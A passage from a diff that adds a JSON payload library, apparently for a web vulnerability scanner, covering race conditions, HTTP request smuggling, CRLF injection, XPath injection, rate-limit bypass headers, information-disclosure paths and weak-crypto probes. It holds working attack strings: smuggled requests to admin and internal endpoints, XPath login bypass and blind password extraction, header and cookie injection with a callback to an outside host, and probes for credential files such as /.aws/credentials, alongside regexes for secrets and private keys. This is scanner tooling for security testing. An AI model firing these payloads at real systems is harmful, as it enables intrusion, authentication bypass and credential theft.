+          "type": "token_redeem"
+        },
+        {
+          "payload": "?action=transfer&from=SHLD{{MARKER}}&amount=1000",
+          "encoding": "none",
+          "type": "transfer_race"
+        },
+        {
+          "payload": "?vote=up&post_id=1&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "vote_race"
+        },
+        {
+          "payload": "?action=book&seat_id=1&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "booking_race"
+        },
+        {
+          "payload": "?action=claim&prize_id=1&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "prize_claim_race"
+        },
+        {
+          "payload": "?action=download&credit_id=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "credit_race"
+        },
+        {
+          "payload": "simultaneous_file_write_SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "toctou_file"
+        },
+        {
+          "payload": "?action=signup_bonus&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "signup_bonus_race"
+        },
+        {
+          "payload": "?action=withdraw&amount=9999&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "withdraw_race"
+        },
+        {
+          "payload": "?session_init=SHLD{{MARKER}}&parallel=true",
+          "encoding": "none",
+          "type": "session_init_race"
+        },
+        {
+          "payload": "?action=promote&user_id=1&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "promotion_race"
+        },
+        {
+          "payload": "?action=like&content_id=1&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "like_race"
+        },
+        {
+          "payload": "?action=lock&resource_id=1&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "lock_race"
+        },
+        {
+          "payload": "?action=delete&id=1&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "delete_race"
+        },
+        {
+          "payload": "?action=email_verify&token=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "email_verify_race"
+        },
+        {
+          "payload": "?action=otp_verify&code=123456&ref=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "otp_race"
+        },
+        {
+          "payload": "?action=redeem&token=SHLD{{MARKER}}&amount=100",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "?action=transfer&from=SHLD{{MARKER}}&amount=1000",
+          "encoding": "base64",
+          "type": "base64_encoded"
+        },
+        {
+          "payload": "?action=register&username=SHLD{{MARKER}}&parallel=1",
+          "encoding": "none",
+          "type": "parallel_register"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "string",
+            "value": "Duplicate entry"
+          },
+          {
+            "type": "string",
+            "value": "UNIQUE constraint failed"
+          },
+          {
+            "type": "string",
+            "value": "already redeemed"
+          },
+          {
+            "type": "string",
+            "value": "used more than once"
+          },
+          {
+            "type": "string",
+            "value": "concurrent modification detected"
+          },
+          {
+            "type": "string",
+            "value": "balance inconsistency"
+          },
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "regex",
+            "value": "transaction.*conflict"
+          },
+          {
+            "type": "regex",
+            "value": "deadlock.*detected"
+          },
+          {
+            "type": "regex",
+            "value": "race.*condition.*detected"
+          },
+          {
+            "type": "string",
+            "value": "optimistic lock failure"
+          },
+          {
+            "type": "regex",
+            "value": "already (used|claimed|redeemed)"
+          }
+        ],
+        "delay_based": true
+      }
+    },
+    "HTTP_Request_Smuggling": {
+      "name_abbr": "HTTP_Request_Smuggling",
+      "name_full": "http_request_smuggling",
+      "severity": "critical",
+      "cvss_base": 9.8,
+      "injection_points": [
+        "header"
+      ],
+      "payloads": [
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 58\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nX-SHLD: SHLD{{MARKER}}\r\nHost: target.com\r\n\r\n",
+          "encoding": "none",
+          "type": "cl_te_admin"
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n5c\r\nGET /SHLD{{MARKER}} HTTP/1.1\r\nHost: target.com\r\n\r\n0\r\n\r\n",
+          "encoding": "none",
+          "type": "te_cl_marker"
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: identity\r\nX-SHLD: SHLD{{MARKER}}\r\n\r\n0\r\n\r\n",
+          "encoding": "none",
+          "type": "te_te_obfuscation"
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /SHLD{{MARKER}} HTTP/1.1\r\n\r\n",
+          "encoding": "none",
+          "type": "cl_te_path_inject"
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 62\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin/users HTTP/1.1\r\nX-Forwarded-For: 127.0.0.1\r\nX-SHLD: SHLD{{MARKER}}\r\n\r\n",
+          "encoding": "none",
+          "type": "cl_te_xff"
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding : chunked\r\nContent-Length: 4\r\nX-SHLD: SHLD{{MARKER}}\r\n\r\n1\r\nZ\r\n0\r\n\r\n",
+          "encoding": "none",
+          "type": "te_space_bypass"
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: target.com\r\nTransfer-Encoding: xchunked\r\nContent-Length: 4\r\nX-SHLD: SHLD{{MARKER}}\r\n\r\n1\r\nZ\r\n0\r\n\r\n",
+          "encoding": "none",
+          "type": "te_xchunked"
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-Encoding: chunked\r\nX-SHLD: SHLD{{MARKER}}\r\n\r\n1\r\nZ\r\nQ\r\n\r\n",
+          "encoding": "none",
+          "type": "te_duplicate_header"
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 50\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nPOST /login HTTP/1.1\r\nContent-Length: 20\r\nX-SHLD: SHLD{{MARKER}}\r\n\r\n",
+          "encoding": "none",
+          "type": "cl_te_login_poison"
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 46\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /robots.txt HTTP/1.1\r\nX-SHLD: SHLD{{MARKER}}\r\n\r\n",
+          "encoding": "none",
+          "type": "cl_te_robots"
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 56\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /static/../admin HTTP/1.1\r\nX-SHLD: SHLD{{MARKER}}\r\n\r\n",
+          "encoding": "none",
+          "type": "cl_te_traversal"
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 80\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: internal-backend.local\r\nX-SHLD: SHLD{{MARKER}}\r\n\r\n",
+          "encoding": "none",
+          "type": "cl_te_host_bypass"
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 58\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nX-SHLD: SHLD{{MARKER}}\r\nHost: target.com\r\n\r\n",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 58\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nX-SHLD: SHLD{{MARKER}}\r\nHost: target.com\r\n\r\n",
+          "encoding": "base64",
+          "type": "base64_encoded"
+        },
+        {
+          "payload": "POST / HTTP/1.1\\r\\nHost: target.com\\r\\nContent-Length: 42\\r\\nTransfer-Encoding:\\x20chunked\\r\\nX-SHLD: SHLD{{MARKER}}\\r\\n\\r\\n0\\r\\n\\r\\n",
+          "encoding": "none",
+          "type": "te_exact_space"
+        },
+        {
+          "payload": "POST / HTTP/1.1\\r\\nHost: target.com\\r\\nTransfer-Encoding: chunked\\r\\nContent-Length: 4\\r\\n\\r\\n5c\\r\\nGET /admin?marker=SHLD{{MARKER}} HTTP/1.1\\r\\nHost: target.com\\r\\n\\r\\n0\\r\\n\\r\\n",
+          "encoding": "none",
+          "type": "te_cl_basic"
+        },
+        {
+          "payload": "POST / HTTP/1.1\\r\\nHost: target.com\\r\\nTransfer-Encoding: chunked\\r\\nTransfer-encoding: identity\\r\\n\\r\\n0\\r\\n\\r\\nGET /admin?marker=SHLD{{MARKER}} HTTP/1.1\\r\\nHost: target.com\\r\\n\\r\\n",
+          "encoding": "none",
+          "type": "te_te_obfuscated"
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nX-SHLD: SHLD{{MARKER}}\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n1\r\nZ\r\nQ\r\n\r\n",
+          "encoding": "none",
+          "type": "h2_downgrade_probe"
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 50\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /SHLD{{MARKER}} HTTP/1.1\r\nFoo: bar",
+          "encoding": "none",
+          "type": "desync_continuation"
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 58\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /.env HTTP/1.1\r\nX-SHLD: SHLD{{MARKER}}\r\nHost: target.com\r\n\r\n",
+          "encoding": "none",
+          "type": "cl_te_env_probe"
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 200\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nCookie: session=SHLD{{MARKER}}\r\nHost: target.com\r\n\r\n",
+          "encoding": "none",
+          "type": "cl_te_cookie_inject"
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 200\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /api/internal HTTP/1.1\r\nX-SHLD: SHLD{{MARKER}}\r\nX-Internal: true\r\nHost: target.com\r\n\r\n",
+          "encoding": "none",
+          "type": "cl_te_internal_api"
+        },
+        {
+          "payload": "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 200\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /api/users HTTP/1.1\r\nX-SHLD: SHLD{{MARKER}}\r\nAuthorization: Bearer admin\r\nHost: target.com\r\n\r\n",
+          "encoding": "none",
+          "type": "cl_te_auth_inject"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "string",
+            "value": "HTTP/1.1 400 Bad Request"
+          },
+          {
+            "type": "string",
+            "value": "Invalid request"
+          },
+          {
+            "type": "string",
+            "value": "chunked encoding conflict"
+          },
+          {
+            "type": "string",
+            "value": "Transfer-Encoding conflict"
+          },
+          {
+            "type": "regex",
+            "value": "admin panel"
+          },
+          {
+            "type": "regex",
+            "value": "desynchronized"
+          },
+          {
+            "type": "regex",
+            "value": "X-SHLD:\\s*SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "regex",
+            "value": "Content-Length mismatch"
+          },
+          {
+            "type": "regex",
+            "value": "HTTP/1\\.[01] 403.*after.*200"
+          },
+          {
+            "type": "string",
+            "value": "Transfer-Encoding: chunked"
+          },
+          {
+            "type": "regex",
+            "value": "Invalid chunk size"
+          }
+        ],
+        "delay_based": false
+      }
+    },
+    "CRLF_Injection": {
+      "name_abbr": "CRLF_Injection",
+      "name_full": "http_header_injection",
+      "severity": "medium",
+      "cvss_base": 5.3,
+      "injection_points": [
+        "query",
+        "header"
+      ],
+      "payloads": [
+        {
+          "payload": "%0d%0aX-SHLD: SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "custom_header_inject"
+        },
+        {
+          "payload": "%0d%0aSet-Cookie: admin=SHLD{{MARKER}}; Path=/; HttpOnly",
+          "encoding": "none",
+          "type": "cookie_inject"
+        },
+        {
+          "payload": "%0d%0aLocation: https://shld-SHLD{{MARKER}}.io",
+          "encoding": "none",
+          "type": "redirect_inject"
+        },
+        {
+          "payload": "%0d%0a%0d%0a<script>fetch('https://shld.io/SHLD{{MARKER}}')</script>",
+          "encoding": "none",
+          "type": "response_splitting_xss"
+        },
+        {
+          "payload": "\r\nX-SHLD: SHLD{{MARKER}}\r\n",
+          "encoding": "none",
+          "type": "raw_crlf_header"
+        },
+        {
+          "payload": "\r\n\r\n<html><body>SHLD{{MARKER}}</body></html>",
+          "encoding": "none",
+          "type": "raw_response_split"
+        },
+        {
+          "payload": "%0aX-SHLD: SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "lf_only_inject"
+        },
+        {
+          "payload": "%0d%0aContent-Length: 0%0d%0aHTTP/1.1 200 OK%0d%0aX-SHLD: SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "response_hijack"
+        },
+        {
+          "payload": "%0d%0aTransfer-Encoding: chunked%0d%0a%0d%0a1%0d%0aSHLD{{MARKER}}%0d%0a0%0d%0a",
+          "encoding": "none",
+          "type": "chunked_inject"
+        },
+        {
+          "payload": "%0d%0aContent-Type: text/html%0d%0a%0d%0a<img src=x onerror=fetch('https://shld.io/SHLD{{MARKER}}')>",
+          "encoding": "none",
+          "type": "content_type_split"
+        },
+        {
+          "payload": "value%0d%0aX-Forwarded-For: 127.0.0.1%0d%0aX-SHLD: SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "xff_inject"
+        },
+        {
+          "payload": "%0d%0aCache-Control: no-cache%0d%0aX-SHLD: SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "cache_header_inject"
+        },
+        {
+          "payload": "%0d%0aAccess-Control-Allow-Origin: *%0d%0aX-SHLD: SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "cors_inject"
+        },
+        {
+          "payload": "%0d%0aContent-Security-Policy: default-src 'none'; script-src 'unsafe-inline'%0d%0aX-SHLD: SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "csp_inject"
+        },
+        {
+          "payload": "%250d%250aX-SHLD: SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "double_url_encode"
+        },
+        {
+          "payload": "%0d%0aLink: <https://shld.io/SHLD{{MARKER}}>; rel=preload",
+          "encoding": "none",
+          "type": "link_preload_inject"
+        },
+        {
+          "payload": "SHLD{{MARKER}}%0d%0aX-Custom: injected",
+          "encoding": "none",
+          "type": "prefix_crlf"
+        },
+        {
+          "payload": "%0d%0aSet-Cookie: session=SHLD{{MARKER}}; Secure; SameSite=None",
+          "encoding": "none",
+          "type": "session_cookie_inject"
+        },
+        {
+          "payload": "%0d%0aX-SHLD: SHLD{{MARKER}}",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "%0d%0aX-SHLD: SHLD{{MARKER}}",
+          "encoding": "base64",
+          "type": "base64_encoded"
+        },
+        {
+          "payload": "%0d%0aX-SHLD: SHLD{{MARKER}}",
+          "encoding": "html",
+          "type": "html_encoded"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "regex",
+            "value": "X-SHLD:\\s*SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "regex",
+            "value": "Set-Cookie:.*admin=SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "regex",
+            "value": "Location:.*shld"
+          },
+          {
+            "type": "string",
+            "value": "CRLF injection detected"
+          },
+          {
+            "type": "string",
+            "value": "HTTP Response Splitting"
+          },
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "string",
+            "value": "shld.io"
+          },
+          {
+            "type": "regex",
+            "value": "Access-Control-Allow-Origin:\\s*\\*"
+          },
+          {
+            "type": "regex",
+            "value": "Content-Security-Policy.*unsafe-inline"
+          },
+          {
+            "type": "regex",
+            "value": "Set-Cookie:.*session=SHLD"
+          },
+          {
+            "type": "regex",
+            "value": "injected.*header.*accepted"
+          },
+          {
+            "type": "string",
+            "value": "Cache-Control: no-cache"
+          }
+        ],
+        "delay_based": false
+      }
+    },
+    "XPATH_Injection": {
+      "name_abbr": "XPATH_Injection",
+      "name_full": "xpath_injection",
+      "severity": "high",
+      "cvss_base": 7.5,
+      "injection_points": [
+        "query",
+        "form"
+      ],
+      "payloads": [
+        {
+          "payload": "' or 'SHLD{{MARKER}}'='SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "basic_or_marker"
+        },
+        {
+          "payload": "' or 1=1 or 'SHLD{{MARKER}}'='",
+          "encoding": "none",
+          "type": "or_always_true"
+        },
+        {
+          "payload": "admin' or 'SHLD{{MARKER}}'='SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "admin_bypass"
+        },
+        {
+          "payload": "' and substring(//user[1]/password,1,1)='a' and 'SHLD{{MARKER}}'='SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "blind_substr"
+        },
+        {
+          "payload": "' and string-length(//user[1]/password)>5 and 'SHLD{{MARKER}}'='SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "blind_length"
+        },
+        {
+          "payload": "' or count(//user)>0 and 'SHLD{{MARKER}}'='SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "count_probe"
+        },
+        {
+          "payload": "' or //user[1]/username='admin' and 'SHLD{{MARKER}}'='SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "user_enum"
+        },
+        {
+          "payload": "') or ('SHLD{{MARKER}}'='SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "paren_or"
+        },
+        {
+          "payload": "x' or name()='SHLD{{MARKER}}' or 'x'='y",
+          "encoding": "none",
+          "type": "name_function"
+        },
+        {
+          "payload": "' or contains(//user/password,'SHLD{{MARKER}}') or '",
+          "encoding": "none",
+          "type": "contains_probe"
+        },
+        {
+          "payload": "' or //node()[name()='SHLD{{MARKER}}'] or '",
+          "encoding": "none",
+          "type": "node_name_probe"
+        },
+        {
+          "payload": "' or //user[role='admin'] and 'SHLD{{MARKER}}'='SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "role_enum"
+        },
+        {
+          "payload": "' or //* and 'SHLD{{MARKER}}'='SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "wildcard_any"
+        },
+        {
+          "payload": "')) or ('SHLD{{MARKER}}'='SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "double_paren"
+        },
+        {
+          "payload": "\" or \"SHLD{{MARKER}}\"=\"SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "double_quote"
+        },
+        {
+          "payload": "' or doc('https://shld.io/SHLD{{MARKER}}') or '",
+          "encoding": "none",
+          "type": "oob_doc_function"
+        },
+        {
+          "payload": "' or boolean(doc('https://shld.io/SHLD{{MARKER}}')) or '",
+          "encoding": "none",
+          "type": "oob_boolean"
+        },
+        {
+          "payload": "' or normalize-space(//user[1]/token)='SHLD{{MARKER}}' or '",
+          "encoding": "none",
+          "type": "normalize_probe"
+        },
+        {
+          "payload": "' or 'SHLD{{MARKER}}'='SHLD{{MARKER}}",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "' or 'SHLD{{MARKER}}'='SHLD{{MARKER}}",
+          "encoding": "html",
+          "type": "html_encoded"
+        },
+        {
+          "payload": "' or 'SHLD{{MARKER}}'='SHLD{{MARKER}}",
+          "encoding": "base64",
+          "type": "base64_encoded"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "string",
+            "value": "XPathException"
+          },
+          {
+            "type": "string",
+            "value": "XPath syntax error"
+          },
+          {
+            "type": "string",
+            "value": "javax.xml.xpath.XPathExpressionException"
+          },
+          {
+            "type": "string",
+            "value": "lxml.etree.XPathEvalError"
+          },
+          {
+            "type": "string",
+            "value": "Invalid predicate"
+          },
+          {
+            "type": "string",
+            "value": "Unexpected token or"
+          },
+          {
+            "type": "string",
+            "value": "Invalid expression"
+          },
+          {
+            "type": "regex",
+            "value": "org\\.apache.*XPath"
+          },
+          {
+            "type": "regex",
+            "value": "net\\.sf\\.saxon.*XPath"
+          },
+          {
+            "type": "string",
+            "value": "libxml2"
+          },
+          {
+            "type": "regex",
+            "value": "SimpleXMLElement.*XPath"
+          }
+        ],
+        "delay_based": false
+      }
+    },
+    "RateLimit": {
+      "name_abbr": "RateLimit",
+      "name_full": "rate_limiting_issues",
+      "severity": "medium",
+      "cvss_base": 5.3,
+      "injection_points": [
+        "header",
+        "query"
+      ],
+      "payloads": [
+        {
+          "payload": "X-Forwarded-For: 127.0.0.1",
+          "encoding": "none",
+          "type": "xff_loopback"
+        },
+        {
+          "payload": "X-Forwarded-For: 1.2.3.SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "xff_rotation_marker"
+        },
+        {
+          "payload": "X-Real-IP: 10.0.0.SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "real_ip_marker"
+        },
+        {
+          "payload": "X-Originating-IP: 192.168.1.SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "originating_ip"
+        },
+        {
+          "payload": "X-Remote-IP: 172.16.0.SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "remote_ip"
+        },
+        {
+          "payload": "X-Client-IP: 10.10.10.SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "client_ip"
+        },
+        {
+          "payload": "True-Client-IP: 5.5.5.SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "true_client_ip"
+        },
+        {
+          "payload": "X-Host: localhost.SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "x_host"
+        },
+        {
+          "payload": "Forwarded: for=127.0.0.1;host=SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "rfc7239_forwarded"
+        },
+        {
+          "payload": "X-Forwarded-For: 0.0.0.0",
+          "encoding": "none",
+          "type": "xff_zero"
+        },
+        {
+          "payload": "X-Forwarded-For: ::1",
+          "encoding": "none",
+          "type": "xff_ipv6_loop"
+        },
+        {
+          "payload": "X-Forwarded-For: 255.255.255.255",
+          "encoding": "none",
+          "type": "xff_broadcast"
+        },
+        {
+          "payload": "X-API-Key: SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "api_key_bypass"
+        },
+        {
+          "payload": "X-RateLimit-Bypass: SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "ratelimit_header"
+        },
+        {
+          "payload": "X-No-Limit: SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "no_limit_header"
+        },
+        {
+          "payload": "X-Forwarded-For: 1.2.3.4, 5.6.7.8, SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "xff_chain"
+        },
+        {
+          "payload": "CF-Connecting-IP: 1.2.3.SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "cloudflare_ip"
+        },
+        {
+          "payload": "X-Azure-ClientIP: 10.0.0.SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "azure_ip"
+        },
+        {
+          "payload": "X-Forwarded-For: 127.0.0.1",
+          "encoding": "url",
+          "type": "url_encoded"
+        },
+        {
+          "payload": "X-Forwarded-For: 127.0.0.1",
+          "encoding": "base64",
+          "type": "base64_encoded"
+        },
+        {
+          "payload": "X-Forwarded-For: 1.2.3.SHLD{{MARKER}}",
+          "encoding": "html",
+          "type": "html_encoded"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "regex",
+            "value": "429 Too Many Requests"
+          },
+          {
+            "type": "string",
+            "value": "Rate limit exceeded"
+          },
+          {
+            "type": "string",
+            "value": "Too many requests"
+          },
+          {
+            "type": "regex",
+            "value": "Retry-After:\\s*\\d+"
+          },
+          {
+            "type": "string",
+            "value": "X-RateLimit-Remaining: 0"
+          },
+          {
+            "type": "string",
+            "value": "quota exceeded"
+          },
+          {
+            "type": "string",
+            "value": "throttled"
+          },
+          {
+            "type": "regex",
+            "value": "SHLD[A-Z0-9]{4,16}"
+          },
+          {
+            "type": "regex",
+            "value": "X-RateLimit-Reset:\\s*\\d+"
+          },
+          {
+            "type": "regex",
+            "value": "HTTP/1\\.[01] 429"
+          },
+          {
+            "type": "regex",
+            "value": "HTTP/1\\.[01] 503"
+          },
+          {
+            "type": "string",
+            "value": "rate_limit_exceeded"
+          }
+        ],
+        "delay_based": true,
+        "min_delay_seconds": 10
+      }
+    },
+    "InfoDisc": {
+      "name_abbr": "InfoDisc",
+      "name_full": "information_disclosure",
+      "severity": "medium",
+      "cvss_base": 5.3,
+      "injection_points": [
+        "path",
+        "query"
+      ],
+      "payloads": [
+        {
+          "payload": "/.env",
+          "encoding": "none",
+          "type": "env_file"
+        },
+        {
+          "payload": "/.env.local",
+          "encoding": "none",
+          "type": "env_local"
+        },
+        {
+          "payload": "/.env.production",
+          "encoding": "none",
+          "type": "env_prod"
+        },
+        {
+          "payload": "/.env.staging",
+          "encoding": "none",
+          "type": "env_staging"
+        },
+        {
+          "payload": "/.git/config",
+          "encoding": "none",
+          "type": "git_config"
+        },
+        {
+          "payload": "/.git/HEAD",
+          "encoding": "none",
+          "type": "git_head"
+        },
+        {
+          "payload": "/.git/COMMIT_EDITMSG",
+          "encoding": "none",
+          "type": "git_commit"
+        },
+        {
+          "payload": "/.svn/entries",
+          "encoding": "none",
+          "type": "svn_entries"
+        },
+        {
+          "payload": "/config.php",
+          "encoding": "none",
+          "type": "php_config"
+        },
+        {
+          "payload": "/web.config",
+          "encoding": "none",
+          "type": "web_config"
+        },
+        {
+          "payload": "/settings.json",
+          "encoding": "none",
+          "type": "settings_json"
+        },
+        {
+          "payload": "/.aws/credentials",
+          "encoding": "none",
+          "type": "aws_creds"
+        },
+        {
+          "payload": "/.bash_history",
+          "encoding": "none",
+          "type": "bash_history"
+        },
+        {
+          "payload": "/backup.sql",
+          "encoding": "none",
+          "type": "sql_backup"
+        },
+        {
+          "payload": "/phpinfo.php",
+          "encoding": "none",
+          "type": "phpinfo"
+        },
+        {
+          "payload": "/debug.log",
+          "encoding": "none",
+          "type": "debug_log"
+        },
+        {
+          "payload": "/error_log",
+          "encoding": "none",
+          "type": "error_log"
+        },
+        {
+          "payload": "/.vscode/settings.json",
+          "encoding": "none",
+          "type": "vscode_settings"
+        },
+        {
+          "payload": "/composer.json",
+          "encoding": "none",
+          "type": "composer_json"
+        },
+        {
+          "payload": "/package.json",
+          "encoding": "none",
+          "type": "package_json"
+        },
+        {
+          "payload": "/Dockerfile",
+          "encoding": "none",
+          "type": "dockerfile"
+        },
+        {
+          "payload": "/docker-compose.yml",
+          "encoding": "none",
+          "type": "docker_compose"
+        }
+      ],
+      "detection": {
+        "indicators": [
+          {
+            "type": "regex",
+            "value": "DB_PASSWORD\\s*=\\s*\\S+"
+          },
+          {
+            "type": "regex",
+            "value": "API_KEY\\s*=\\s*\\S+"
+          },
+          {
+            "type": "regex",
+            "value": "SECRET_KEY\\s*=\\s*\\S+"
+          },
+          {
+            "type": "regex",
+            "value": "aws_access_key_id\\s*=\\s*[A-Z0-9]+"
+          },
+          {
+            "type": "regex",
+            "value": "aws_secret_access_key\\s*=\\s*\\S+"
+          },
+          {
+            "type": "string",
+            "value": "-----BEGIN RSA PRIVATE KEY-----"
+          },
+          {
+            "type": "string",
+            "value": "-----BEGIN OPENSSH PRIVATE KEY-----"
+          },
+          {
+            "type": "string",
+            "value": "-----BEGIN PRIVATE KEY-----"
+          },
+          {
+            "type": "regex",
+            "value": "PHP Version \\d+\\.\\d+"
+          },
+          {
+            "type": "string",
+            "value": "[core]"
+          },
+          {
+            "type": "string",
+            "value": "repositoryformatversion"
+          },
+          {
+            "type": "regex",
+            "value": "phpinfo\\(\\)"
+          },
+          {
+            "type": "regex",
+            "value": "\"password\"\\s*:\\s*\""
+          },
+          {
+            "type": "regex",
+            "value": "(?i)FROM\\s+mysql\\.user"
+          }
+        ],
+        "delay_based": false
+      }
+    },
+    "InsecCrypto": {
+      "name_abbr": "InsecCrypto",
+      "name_full": "insecure_crypto",
+      "severity": "medium",
+      "cvss_base": 5.3,
+      "injection_points": [
+        "header"
+      ],
+      "payloads": [
+        {
+          "payload": "weak_cipher_detection_SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "probe_marker"
+        },
+        {
+          "payload": "TLS_RSA_WITH_RC4_128_MD5_probe_SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "rc4_probe"
+        },
+        {
+          "payload": "TLS_RSA_WITH_DES_CBC_SHA_probe_SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "des_probe"
+        },
+        {
+          "payload": "ssl3_probe_SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "ssl3_probe"
+        },
+        {
+          "payload": "tls10_probe_SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "tls10_probe"
+        },
+        {
+          "payload": "tls11_probe_SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "tls11_probe"
+        },
+        {
+          "payload": "md5_hash_probe_SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "md5_probe"
+        },
+        {
+          "payload": "sha1_cert_probe_SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "sha1_probe"
+        },
+        {
+          "payload": "weak_dh512_probe_SHLD{{MARKER}}",
+          "encoding": "none",
+          "type": "dh512_probe"
+        },
